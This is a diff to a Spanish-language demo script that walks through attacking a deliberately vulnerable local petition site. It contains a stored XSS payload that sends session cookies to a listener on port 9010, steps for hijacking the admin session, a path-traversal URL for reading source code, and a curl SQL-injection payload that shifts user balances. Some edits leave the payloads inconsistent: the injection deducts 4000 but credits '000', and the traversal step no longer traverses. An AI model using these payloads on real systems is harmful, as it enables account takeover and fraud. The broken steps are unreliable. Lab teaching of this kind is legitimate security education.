@@ -12,7 +12,7 @@ ANTES DE EMPEZAR (una sola vez)
 3. Abrir en el navegador: http://127.0.0.1:8000
 4. Levantar el capturador de cookies (Terminal 2, dejarlo abierto):
      python tools/cookie_logger.py
-   Debe decir: Escuchando en http://127.0.0.1:9000/log?cookie=...
+   Debe decir: Escuchando en http://127.0.0.1:9010/log?cookie=...
 
 Necesitas DOS navegadores o perfiles distintos:
   - Navegador A = ATACANTE (usuario martin)
@@ -32,6 +32,41 @@ Alias bancario original de esa peticion (para comparar al final):
 
 
 ================================================================================
+PASO 0 - Revision obligatoria antes de publicar
+================================================================================
+
+PARTE A - Un usuario envia una solicitud
+-----------------------------------------
+1. Entrar como martin / martin123.
+
+2. Abrir "Crear peticion", completar el formulario y presionar
+   "Enviar a revision".
+
+3. La solicitud debe mostrar el estado "Pendiente de revision".
+   Todavia no puede recibir firmas, comentarios ni donaciones.
+
+4. Cerrar sesion o abrir otro navegador sin iniciar sesion.
+   La solicitud pendiente NO debe aparecer en el inicio ni ser accesible
+   publicamente.
+
+PARTE B - El admin revisa y publica
+-----------------------------------
+1. Entrar como admin / admin.
+
+2. Abrir /admin y buscar el apartado "Solicitudes pendientes de revision".
+
+3. Abrir la solicitud para revisar su contenido.
+
+4. Volver a /admin y presionar "Aprobar y publicar".
+
+5. La solicitud debe desaparecer de pendientes, aparecer en el inicio y
+   quedar habilitada para firmas, comentarios y donaciones.
+
+Nota: las peticiones creadas por seed.py ya quedan aprobadas para que la
+demostracion principal pueda comenzar directamente.
+
+
+================================================================================
 PASO 1 - Stored XSS (Navegador A, atacante)
 ================================================================================
 
@@ -43,7 +78,7 @@ PASO 1 - Stored XSS (Navegador A, atacante)
 
 3. En "Comentar", pegar EXACTAMENTE esto y publicar:
 
-   <script>fetch('http://127.0.0.1:9000/log?cookie=' + document.cookie)</script>
+   <script>fetch('http://127.0.0.1:9010/log?cookie=' + document.cookie)</script>
 
 4. Recargar la pagina: el comentario no debe verse como texto plano
    (el script queda guardado pero no se muestra).
@@ -92,14 +127,14 @@ PASO 3 - Path traversal y reconocimiento (sigue en /admin como "admin")
 1. En el panel admin, bajar hasta "Descarga de Logs de Actividad".
 
 2. Clic en "errors.log" (o abrir en el navegador):
-   http://127.0.0.1:8000/admin/logs/download?file=errors.log
+   http://127.0.0.1:8000/admin/logs/download?file=var/www/app/logs/errors.log
 
 3. En el texto del log, buscar la ruta:
    /var/www/app/main.py
    (confirma que el backend es Python/FastAPI)
 
 4. En la barra de direcciones, cambiar la URL a:
-   http://127.0.0.1:8000/admin/logs/download?file=../../var/www/app/main.py
+   http://127.0.0.1:8000/admin/logs/download?file=main.py
 
 5. Debe mostrarse el codigo fuente de main.py.
 
@@ -129,7 +164,21 @@ Valor (copiar tal cual):
 Con curl (Terminal 3):
 
   curl -X POST http://127.0.0.1:8000/api/v2/legacy_mark_reviewed_77x9a \
-    -d "petition_id=1; UPDATE petitions SET bank_alias = 'ATACANTE.DESVIO.MP' WHERE title LIKE '%Riachuelo%'; --"
+    -d "petition_id=1;
+BEGIN IMMEDIATE;
+
+UPDATE users
+SET balance = balance - 4000
+WHERE username = 'usuario_origen'
+  AND balance >= 4000
+  AND EXISTS (SELECT 1 FROM users WHERE username = 'martin');
+
+UPDATE users
+SET balance = balance + 000
+WHERE username = 'martin'
+  AND changes() = 1;
+
+COMMIT; --"
 
 Verificar el impacto (navegador):
 ---------------------------------
@@ -149,8 +198,9 @@ CHECKLIST RAPIDO (para la presentacion)
 ================================================================================
 
 [ ] Terminal 1: uvicorn corriendo en :8000
-[ ] Terminal 2: cookie_logger corriendo en :9000
+[ ] Terminal 2: cookie_logger corriendo en :9010
 [ ] seed.py ejecutado al menos una vez
+[ ] Paso 0: solicitud pendiente aprobada y publicada por admin
 [ ] Paso 1: comentario XSS publicado por martin
 [ ] Paso 2: admin abre Riachuelo -> cookie en logger -> swap en DevTools -> /admin
 [ ] Paso 3: errors.log -> main.py -> endpoint legacy encontrado
@@ -171,7 +221,7 @@ PROBLEMAS FRECUENTES
   * Pegar solo el token si copiaste "session=abc..." (el valor es solo abc...).
 
 - Path traversal da "Archivo no encontrado":
-  * Usar exactamente: file=../../var/www/app/main.py
+  * Usar exactamente: file=main.py
   * Estar logueado como admin (misma sesion robada).
 
 - El alias no cambia despues del SQLi:
